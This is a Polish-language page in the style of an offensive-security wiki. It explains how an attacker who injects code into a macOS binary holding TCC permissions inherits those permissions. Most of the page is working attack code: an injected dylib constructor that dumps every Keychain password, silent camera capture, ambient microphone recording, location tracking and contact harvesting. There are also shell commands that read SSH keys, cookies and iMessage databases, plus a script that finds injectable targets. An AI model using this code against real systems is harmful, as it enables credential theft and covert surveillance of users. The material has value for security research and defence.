# Kradzież poświadczeń i danych w macOS za pośrednictwem uprawnień TCC

{{#include ../../../../banners/hacktricks-training.md}}

## Wprowadzenie

macOS TCC (Transparency, Consent, and Control) chroni dostęp do wrażliwych danych użytkownika. Gdy attacker **przejmie binary, który ma już przyznane uprawnienia TCC**, dziedziczy te uprawnienia. Ta strona dokumentuje potencjał wykorzystania każdego uprawnienia TCC związanego z kradzieżą danych.<sup>[[2]](#references)</sup>

> [!WARNING]
> Wstrzyknięcie kodu do binary z przyznanymi uprawnieniami TCC (za pośrednictwem DYLD injection, dylib hijacking lub task port) **niejawnie dziedziczy wszystkie jego uprawnienia TCC**. Gdy ten sam proces odczytuje chronione dane, nie pojawia się żaden dodatkowy monit ani weryfikacja.<sup>[[4]](#references)</sup>

---

## Grupy dostępu Keychain

### Łup

macOS Keychain przechowuje:
- **Hasła Wi-Fi** — wszystkie zapisane dane uwierzytelniające sieci bezprzewodowych
- **Hasła do stron internetowych** — hasła Safari, Chrome (gdy używa Keychain) i innych przeglądarek
- **Hasła aplikacji** — konta e-mail, dane uwierzytelniające VPN, tokeny deweloperskie
- **Certyfikaty i klucze prywatne** — podpisywanie kodu, TLS klienta, szyfrowanie S/MIME
- **Bezpieczne notatki** — sekrety przechowywane przez użytkownika

### Entitlement: `keychain-access-groups`

Elementy Keychain są organizowane w **grupy dostępu**. Entitlement `keychain-access-groups` aplikacji określa, do których grup może ona uzyskać dostęp:<sup>[[1]](#references)</sup>
```xml
<key>keychain-access-groups</key>
<array>
<string>com.apple.cfnetwork</string>   <!-- Network passwords -->
<string>com.apple.security.personal-information.identity</string>  <!-- Personal certs -->
<string>apple</string>                  <!-- Broad Apple group -->
<string>InternetAccounts</string>       <!-- Internet account passwords -->
</array>
```
### Eksploatacja
```bash
# Find binaries with broad keychain access groups
sqlite3 /tmp/executables.db "
SELECT path FROM executables
WHERE entitlementsString LIKE '%keychain-access-groups%'
AND isAppleBin = 0
ORDER BY privileged DESC;"

# If you can inject into such a binary, enumerate keychain items:
security dump-keychain -d ~/Library/Keychains/login.keychain-db 2>&1 | head -100

# Find specific passwords
security find-generic-password -s "Wi-Fi" -w 2>&1
security find-internet-password -s "github.com" 2>&1
```
### Code Injection → Keychain Theft
```objc
// Injected dylib code — runs with the target's keychain groups
#import <Security/Security.h>

__attribute__((constructor))
void dumpKeychain(void) {
NSDictionary *query = @{
(__bridge id)kSecClass: (__bridge id)kSecClassGenericPassword,
(__bridge id)kSecReturnAttributes: @YES,
(__bridge id)kSecReturnData: @YES,
(__bridge id)kSecMatchLimit: (__bridge id)kSecMatchLimitAll
};

CFArrayRef results = NULL;
OSStatus status = SecItemCopyMatching((__bridge CFDictionaryRef)query, (CFTypeRef *)&results);

if (status == errSecSuccess) {
NSArray *items = (__bridge NSArray *)results;
for (NSDictionary *item in items) {
NSString *service = item[(__bridge id)kSecAttrService];
NSString *account = item[(__bridge id)kSecAttrAccount];
NSData *passData = item[(__bridge id)kSecValueData];
NSString *password = [[NSString alloc] initWithData:passData encoding:NSUTF8StringEncoding];
// service, account, password — the full credential triple
}
}
}
```
---

## Dostęp do kamery (kTCCServiceCamera)

### Eksploatacja

Binary z uprawnieniem TCC do kamery (przyznanym przez `kTCCServiceCamera` lub entitlement `com.apple.security.device.camera`) może przechwytywać zdjęcia i nagrania wideo:
```bash
# Find camera-authorized binaries
sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db \
"SELECT client FROM access WHERE service='kTCCServiceCamera' AND auth_value=2;"
```
### Ciche przechwytywanie
```objc
// Injected into a camera-entitled process
#import <AVFoundation/AVFoundation.h>

@interface SilentCapture : NSObject <AVCaptureVideoDataOutputSampleBufferDelegate>
@property (strong) AVCaptureSession *session;
@end

@implementation SilentCapture
- (void)startCapture {
self.session = [[AVCaptureSession alloc] init];
AVCaptureDevice *camera = [AVCaptureDevice defaultDeviceWithMediaType:AVMediaTypeVideo];
AVCaptureDeviceInput *input = [AVCaptureDeviceInput deviceInputWithDevice:camera error:nil];
[self.session addInput:input];

AVCaptureVideoDataOutput *output = [[AVCaptureVideoDataOutput alloc] init];
[output setSampleBufferDelegate:self queue:dispatch_get_global_queue(0, 0)];
[self.session addOutput:output];

[self.session startRunning];
// Camera LED turns on — but a brief capture may go unnoticed
}

- (void)captureOutput:(AVCaptureOutput *)output
didOutputSampleBuffer:(CMSampleBufferRef)sampleBuffer
fromConnection:(AVCaptureConnection *)connection {
// Each frame can be saved to disk or exfiltrated
// Stop after capturing a few frames to minimize LED time
[self.session stopRunning];
}
@end
```
> [!TIP]
> Począwszy od **macOS Sonoma**, wskaźnik kamery na pasku menu jest stale widoczny i nie można go programowo ukryć. W **starszych wersjach macOS** krótkie przechwytywanie może nie powodować zauważalnego pojawienia się wskaźnika.

---

## Dostęp do mikrofonu (kTCCServiceMicrophone)

### Exploitation

Dostęp do mikrofonu przechwytuje cały dźwięk z wbudowanego mikrofonu, zestawu słuchawkowego lub podłączonych urządzeń wejściowych audio:
```bash
# Find mic-authorized binaries
sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db \
"SELECT client FROM access WHERE service='kTCCServiceMicrophone' AND auth_value=2;"
```
### Atak: Ambient Recording
```objc
// Injected into a mic-entitled process
#import <AVFoundation/AVFoundation.h>

- (void)recordAudio {
NSURL *url = [NSURL fileURLWithPath:@"/tmp/recording.m4a"];
NSDictionary *settings = @{
AVFormatIDKey: @(kAudioFormatMPEG4AAC),
AVSampleRateKey: @44100.0,
AVNumberOfChannelsKey: @1
};
AVAudioRecorder *recorder = [[AVAudioRecorder alloc] initWithURL:url settings:settings error:nil];
[recorder record];
// Records everything: conversations, phone calls, ambient audio

// Stop after a duration
dispatch_after(dispatch_time(DISPATCH_TIME_NOW, 60 * NSEC_PER_SEC),
dispatch_get_main_queue(), ^{
[recorder stop];
// Exfiltrate /tmp/recording.m4a
});
}
```
---

## Śledzenie lokalizacji (kTCCServiceLocation)

### Eksploatacja
```bash
# Find location-authorized binaries
sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db \
"SELECT client FROM access WHERE service LIKE '%Location%' AND auth_value=2;"
```
### Ciągłe śledzenie
```objc
#import <CoreLocation/CoreLocation.h>

@interface Tracker : NSObject <CLLocationManagerDelegate>
@end

@implementation Tracker
- (void)startTracking {
CLLocationManager *mgr = [[CLLocationManager alloc] init];
mgr.delegate = self;
mgr.desiredAccuracy = kCLLocationAccuracyBest;
[mgr startUpdatingLocation];
}

- (void)locationManager:(CLLocationManager *)manager
didUpdateLocations:(NSArray<CLLocation *> *)locations {
CLLocation *loc = locations.lastObject;
// loc.coordinate.latitude, loc.coordinate.longitude
// Reveals: home address, work address, travel patterns, daily routine
NSString *entry = [NSString stringWithFormat:@"%f,%f,%@\n",
loc.coordinate.latitude, loc.coordinate.longitude, [NSDate date]];
// Append to tracking log
}
@end
```
---

## Kontakty / Kalendarz / Zdjęcia

### Eksfiltracja danych osobowych

| Usługa TCC | Framework | Dane |
|---|---|---|
| `kTCCServiceAddressBook` | `Contacts.framework` | Imiona i nazwiska, e-maile, numery telefonów, adresy |
| `kTCCServiceCalendar` | `EventKit` | Spotkania, uczestnicy, lokalizacje |
| `kTCCServicePhotos` | `Photos.framework` | Zdjęcia, zrzuty ekranu, metadane lokalizacji |
```bash
# Find authorized binaries for each service
for svc in kTCCServiceAddressBook kTCCServiceCalendar kTCCServicePhotos; do
echo "=== $svc ==="
sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db \
"SELECT client FROM access WHERE service='$svc' AND auth_value=2;"
done
```
### Zbieranie kontaktów
```objc
#import <Contacts/Contacts.h>

CNContactStore *store = [[CNContactStore alloc] init];
NSArray *keys = @[CNContactGivenNameKey, CNContactFamilyNameKey,
CNContactEmailAddressesKey, CNContactPhoneNumbersKey];
CNContactFetchRequest *request = [[CNContactFetchRequest alloc] initWithKeysToFetch:keys];

[store enumerateContactsWithFetchRequest:request error:nil
usingBlock:^(CNContact *contact, BOOL *stop) {
// contact.givenName, contact.familyName
// contact.emailAddresses, contact.phoneNumbers
// All contacts exfiltrated for social engineering / spear phishing
}];
```
---

## Dostęp do konta iCloud

### Entitlement: `com.apple.private.icloud-account-access`

To entitlement umożliwia komunikację z usługą XPC `com.apple.iCloudHelper`, zapewniając dostęp do:
- **tokenów iCloud** — tokenów uwierzytelniających Apple ID użytkownika
- **iCloud Drive** — zsynchronizowanych dokumentów ze wszystkich urządzeń
- **iCloud Keychain** — haseł synchronizowanych na wszystkich urządzeniach Apple
- **Find My** — lokalizacji wszystkich urządzeń Apple użytkownika<sup>[[3]](#references)</sup>
```bash
# Find iCloud-entitled binaries
sqlite3 /tmp/executables.db "
SELECT path FROM executables
WHERE iCloudAccs = 1
ORDER BY privileged DESC;"
```
> [!CAUTION]
> Compromitacja pliku binarnego z uprawnieniami iCloud rozszerza atak z **pojedynczego urządzenia na cały ekosystem Apple**: inne komputery Mac, iPhone'y, iPady i Apple Watch. Synchronizacja iCloud Keychain oznacza, że hasła ze wszystkich urządzeń są dostępne.

---

## Pełny dostęp do dysku (kTCCServiceSystemPolicyAllFiles)

### Najpotężniejsze uprawnienie TCC

Pełny dostęp do dysku zapewnia możliwość odczytu **każdego pliku w systemie**, w tym:
- danych innych aplikacji (Messages, Mail, historia Safari)
- baz danych TCC (ujawniających wszystkie pozostałe uprawnienia)
- kluczy SSH i konfiguracji
- cookies przeglądarek i tokenów sesji
- baz danych aplikacji i pamięci podręcznych
```bash
# Find FDA-granted binaries
sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db \
"SELECT client FROM access WHERE service='kTCCServiceSystemPolicyAllFiles' AND auth_value=2;"

# With FDA, read anything:
cat ~/Library/Messages/chat.db              # iMessage history
cat ~/Library/Safari/History.db             # Safari browsing history
cat ~/Library/Cookies/Cookies.binarycookies # Browser cookies
cat ~/.ssh/id_rsa                           # SSH private key
```
---

## Macierz priorytetów eksploatacji

Podczas oceny wstrzykiwalnych binariów z uprawnieniami TCC ustalaj priorytety na podstawie wartości danych:

| Priorytet | Uprawnienie TCC | Dlaczego |
|---|---|---|
| **Krytyczny** | Pełny dostęp do dysku | Dostęp do wszystkiego |
| **Krytyczny** | TCC Manager | Może przyznać dowolne uprawnienie |
| **Wysoki** | Grupy dostępu Keychain | Wszystkie zapisane hasła |
| **Wysoki** | Dostęp do konta iCloud | Przejęcie wielu urządzeń |
| **Wysoki** | Monitorowanie wprowadzania danych (ListenEvent) | Keylogging |
| **Wysoki** | Ułatwienia dostępu | Sterowanie GUI, samodzielne przyznawanie uprawnień |
| **Średni** | Przechwytywanie ekranu | Przechwytywanie danych wizualnych |
| **Średni** | Kamera + mikrofon | Inwigilacja |
| **Średni** | Kontakty + kalendarz | Dane do social engineeringu |
| **Niski** | Lokalizacja | Śledzenie fizyczne |
| **Niski** | Zdjęcia | Dane osobowe |

## Skrypt enumeracyjny
```bash
#!/bin/bash
echo "=== TCC Credential Theft Surface Audit ==="

echo -e "\n[*] High-value TCC grants (injectable binaries):"
sqlite3 /tmp/executables.db "
SELECT path, tccPermsStr FROM executables
WHERE (noLibVal = 1 OR allowDyldEnv = 1)
AND tccPermsStr IS NOT NULL
AND tccPermsStr != ''
ORDER BY privileged DESC
LIMIT 30;" 2>/dev/null

echo -e "\n[*] Keychain-entitled injectable binaries:"
sqlite3 /tmp/executables.db "
SELECT path FROM executables
WHERE entitlementsString LIKE '%keychain-access-groups%'
AND (noLibVal = 1 OR allowDyldEnv = 1);" 2>/dev/null

echo -e "\n[*] iCloud-entitled binaries:"
sqlite3 /tmp/executables.db "
SELECT path FROM executables WHERE iCloudAccs = 1;" 2>/dev/null
```
## References

- [1] [Apple Developer — Usługi Keychain](https://developer.apple.com/documentation/security/keychain_services)
- [2] [Apple Developer — TCC](https://developer.apple.com/documentation/security/protecting-the-user-s-privacy)
- [3] [OBTS v5.0 — „Co dzieje się na Twoim Macu, zostaje w iCloud firmy Apple?!” (Wojciech Regula)](https://www.youtube.com/watch?v=_6e2LhmxVc0)
- [4] [Objective-See — Exploitation TCC](https://objective-see.org/blog/blog_0x4C.html)
{{#include ../../../../banners/hacktricks-training.md}}
